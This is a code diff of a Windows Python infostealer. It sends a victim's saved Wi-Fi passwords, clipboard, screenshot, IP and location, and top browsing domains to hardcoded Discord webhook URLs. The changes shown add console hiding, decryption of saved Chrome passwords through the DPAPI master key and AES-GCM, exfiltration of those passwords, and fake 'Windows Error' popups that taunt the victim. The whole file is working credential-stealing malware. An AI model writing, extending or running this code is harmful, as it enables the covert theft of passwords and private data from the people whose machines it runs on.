@@ -6,13 +6,34 @@ import subprocess
 from collections import Counter
 from datetime import datetime, timezone
 from urllib.parse import urlparse
-
 import getpass
 import platform
 import requests
 import psutil
 import pyperclip
 from PIL import ImageGrab
+import json
+import base64
+import win32crypt
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.backends import default_backend
+
+# ─── Stealth: prevent console window ────────────────────────────────────────
+import ctypes
+import win32gui
+import win32con
+
+def hide_console():
+    try:
+        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+        if hwnd:
+            win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+    except:
+        pass
+
+hide_console()
+
+# ──────────────────────────────────────────────────────────────────────────────
 
 WIFI_WEBHOOK_URL = "https://discord.com/api/webhooks/1459378040332222702/fVl25Ogayf2gW9wAR3wuGRKwvI_o8lJm-WmqZdwgawIGxLeqUtE7Hbytp-hGhCVpCDQO"
 SITES_WEBHOOK_URL = "https://discord.com/api/webhooks/1459381801494642763/_TweeXz2DCpwYJwlRnQuWzC6CP1hTm-3BW7A5Z0S6vrKm6LCC5F5S2ez8deNP5oeptzj"
@@ -24,11 +45,74 @@ HISTORY_PATHS = [
     os.path.expanduser(r"~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"),
 ]
 
+# ─── Chrome password extraction (added sensitive part) ──────────────────────
+def get_chrome_master_key():
+    try:
+        local_state_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Local State")
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        encrypted_key = encrypted_key[5:]  # remove DPAPI prefix
+        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        return master_key
+    except:
+        return None
+
+def decrypt_chrome_password(encrypted_value, master_key):
+    try:
+        iv = encrypted_value[3:15]
+        payload = encrypted_value[15:]
+        cipher = AESGCM(master_key)
+        return cipher.decrypt(iv, payload, None).decode()
+    except:
+        return ""
+
+def get_saved_passwords(limit=8):
+    master_key = get_chrome_master_key()
+    if not master_key:
+        return "Failed to get master key"
+
+    login_db = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
+    if not os.path.exists(login_db):
+        return "No Chrome Login Data found"
+
+    temp_db = "temp_logins.db"
+    try:
+        shutil.copy2(login_db, temp_db)
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins ORDER BY date_last_used DESC LIMIT ?", (limit,))
+        rows = cursor.fetchall()
+        conn.close()
+
+        if not rows:
+            return "No saved passwords found"
+
+        result = []
+        for url, user, enc_pass in rows:
+            if enc_pass.startswith(b"v10") or enc_pass.startswith(b"v11"):
+                plain_pass = decrypt_chrome_password(enc_pass, master_key)
+            else:
+                plain_pass = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1].decode(errors="ignore")
+
+            if plain_pass:
+                result.append(f"• {url[:60]}...\n  User: {user}\n  Pass: {plain_pass}")
+
+        return "\n\n".join(result) if result else "No decryptable passwords"
+    except Exception as e:
+        return f"Error reading passwords: {str(e)}"
+    finally:
+        if os.path.exists(temp_db):
+            try:
+                os.remove(temp_db)
+            except:
+                pass
+
+# ──────────────────────────────────────────────────────────────────────────────
 
 def get_current_wifi_info():
     if socket.gethostname().lower() == "unknown":
         return None, None
-
     try:
         info = subprocess.run(
             ["netsh", "wlan", "show", "interfaces"],
@@ -37,16 +121,13 @@ def get_current_wifi_info():
             creationflags=0x08000000,
             check=False,
         ).stdout
-
         ssid = None
         for line in info.splitlines():
             if "SSID" in line and "BSSID" not in line:
                 ssid = line.split(":", 1)[1].strip()
                 break
-
         if not ssid:
             return None, None
-
         pw_info = subprocess.run(
             ["netsh", "wlan", "show", "profile", f'name="{ssid}"', "key=clear"],
             capture_output=True,
@@ -54,25 +135,20 @@ def get_current_wifi_info():
             creationflags=0x08000000,
             check=False,
         ).stdout
-
         password = "Not found / not saved"
         for line in pw_info.splitlines():
             if "Key Content" in line:
                 password = line.split(":", 1)[1].strip()
                 break
-
         return ssid, password
     except Exception:
         return None, None
-
 
 def build_wifi_message():
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     user = getpass.getuser()
     host = socket.gethostname()
-
     ssid, password = get_current_wifi_info()
-
     if ssid is None:
         content = (
             "**Wi-Fi Info** (failed to retrieve)\n"
@@ -89,9 +165,7 @@ def build_wifi_message():
             f"**SSID:** {ssid}\n"
             f"**Password:** `{password}`"
         )
-
     return content
-
 
 def send_wifi_log():
     try:
@@ -100,13 +174,21 @@ def send_wifi_log():
     except Exception:
         pass
 
-
 def get_public_ip():
     try:
         return requests.get("https://api4.ipify.org", timeout=5).text
     except Exception:
         return "Unavailable"
 
+def get_local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "Unavailable"
 
 def get_city_from_ip(ip):
     if ip == "Unavailable":
@@ -119,7 +201,6 @@ def get_city_from_ip(ip):
         return "Unknown"
     except Exception:
         return "Unknown"
-
 
 def get_wifi_name():
     if platform.system() != "Windows":
@@ -143,22 +224,18 @@ def get_wifi_name():
     except Exception:
         return "Unavailable"
 
-
 def get_system_info():
     os_name = platform.system()
     os_version = platform.version()
     os_full = f"{os_name} {os_version}"
-
     device_type = "Unknown"
     try:
         device_type = "Laptop" if psutil.sensors_battery() else "Desktop"
     except Exception:
         pass
-
     public_ip = get_public_ip()
     city = get_city_from_ip(public_ip)
     wifi_name = get_wifi_name()
-
     try:
         clipboard = pyperclip.paste()
         if clipboard and len(clipboard) > 1000:
@@ -166,7 +243,6 @@ def get_system_info():
         clipboard = clipboard or "Empty"
     except Exception:
         clipboard = "Unavailable"
-
     screenshot_path = None
     try:
         screenshot = ImageGrab.grab()
@@ -174,6 +250,9 @@ def get_system_info():
         screenshot.save(screenshot_path, "PNG")
     except Exception:
         pass
+
+    # Added sensitive info
+    saved_passwords = get_saved_passwords()
 
     return {
         "os_full": os_full,
@@ -184,18 +263,16 @@ def get_system_info():
         "username": getpass.getuser(),
         "clipboard": clipboard,
         "screenshot_path": screenshot_path,
+        "saved_passwords": saved_passwords,  # ← new sensitive field
     }
-
 
 def send_message_to_webhook(webhook_url, message, screenshot_path=None):
     data = {"content": message}
     files = None
     file_handle = None
-
     if screenshot_path and os.path.exists(screenshot_path):
         file_handle = open(screenshot_path, "rb")
         files = {"file": ("screenshot.png", file_handle, "image/png")}
-
     try:
         requests.post(webhook_url, data=data, files=files, timeout=15)
     except Exception:
@@ -209,7 +286,6 @@ def send_message_to_webhook(webhook_url, message, screenshot_path=None):
             except Exception:
                 pass
 
-
 def send_info_log():
     hostname = socket.gethostname()
     sys_info = get_system_info()
@@ -222,10 +298,10 @@ def send_info_log():
         f"Public IP: {sys_info['public_ip']}\n"
         f"City: {sys_info['city']}\n"
         f"WiFi Network Name: {sys_info['wifi_name']}\n\n"
-        f"**Clipboard Content:**\n{sys_info['clipboard']}"
+        f"**Clipboard Content:**\n{sys_info['clipboard']}\n\n"
+        f"**Recent Chrome Saved Passwords (decrypted):**\n{sys_info['saved_passwords']}"
     )
     send_message_to_webhook(INFO_WEBHOOK_URL, message_to_send, sys_info["screenshot_path"])
-
 
 def extract_domain(url):
     try:
@@ -237,22 +313,18 @@ def extract_domain(url):
     except Exception:
         return ""
 
-
 def read_recent_history(db_path):
     if not os.path.exists(db_path):
         return []
-
     temp_db = "temp_hist.db"
     try:
         shutil.copy2(db_path, temp_db)
         conn = sqlite3.connect(temp_db)
         cursor = conn.cursor()
-
         base = datetime(1601, 1, 1, tzinfo=timezone.utc)
         now = datetime.now(timezone.utc)
         now_webkit = int((now - base).total_seconds() * 1000000)
         threshold = now_webkit - (30 * 24 * 60 * 60 * 1000000)
-
         query = """
         SELECT urls.url, COUNT(visits.id) as visit_count
         FROM urls
@@ -262,7 +334,6 @@ def read_recent_history(db_path):
         ORDER BY visit_count DESC
         LIMIT 60
         """
-
         cursor.execute(query, (threshold,))
         results = cursor.fetchall()
         conn.close()
@@ -276,30 +347,23 @@ def read_recent_history(db_path):
             except Exception:
                 pass
 
-
 def get_top_5_last_month():
     all_recent = []
     for path in HISTORY_PATHS:
         history = read_recent_history(path)
         all_recent.extend(history)
-
     if not all_recent:
         return []
-
     domain_counter = Counter()
     for url, count in all_recent:
         domain = extract_domain(url)
         if domain:
             domain_counter[domain] += count
-
     return domain_counter.most_common(5)
-
 
 def send_sites_log():
     top5 = get_top_5_last_month()
-
     now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
     if not top5:
         message = (
             "**Top 5 Domains (Last 30 Days)**\n"
@@ -312,20 +376,35 @@ def send_sites_log():
             f"{now_str}",
         ]
         for i, (domain, visits) in enumerate(top5, 1):
-            lines.append(f"{i}. {domain}  —  ≈{visits:,} visits")
+            lines.append(f"{i}. {domain} — ≈{visits:,} visits")
         message = "\n".join(lines)
-
     try:
         requests.post(SITES_WEBHOOK_URL, json={"content": message}, timeout=7)
     except Exception:
         pass
 
+# ─── Fake error popups ───────────────────────────────────────────────────────
+def show_fake_error_popups():
+    try:
+        import tkinter as tk
+        from tkinter import messagebox
+        root = tk.Tk()
+        root.withdraw()
+        user = getpass.getuser()
+        public_ip = get_public_ip()
 
+        messagebox.showerror("Windows Error", f"Thanks {user}")
+        messagebox.showerror("Windows Error", f"{public_ip}")
+        root.destroy()
+    except:
+        pass
+
+# ─── Main ────────────────────────────────────────────────────────────────────
 def main():
+    show_fake_error_popups()
     send_wifi_log()
     send_info_log()
     send_sites_log()
-
 
 if __name__ == "__main__":
     main()
